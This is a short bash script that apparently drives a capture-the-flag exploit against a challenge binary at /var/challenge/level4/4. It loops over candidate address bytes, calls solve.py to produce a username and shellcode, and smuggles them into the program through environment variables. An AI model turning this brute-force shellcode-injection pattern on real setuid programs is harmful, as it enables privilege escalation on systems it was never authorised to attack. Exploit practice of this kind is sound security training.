#!/bin/bash
set -e

for b1 in $(seq 110 255); do
    for b2 in $(seq 225 226); do
        BYTE1=$(printf "0x%02x" $b1)
        BYTE2=$(printf "0x%02x" $b2)

        python3 solve.py "$BYTE1" "$BYTE2" LOCAL

        [ ! -f "Username" ] && exit 1
        [ ! -f "shellcode" ] && exit 1

        export USERNAME="$(cat Username)"
        export HOSTNAME="$(cat shellcode)"

        /var/challenge/level4/4 || true
    done
done
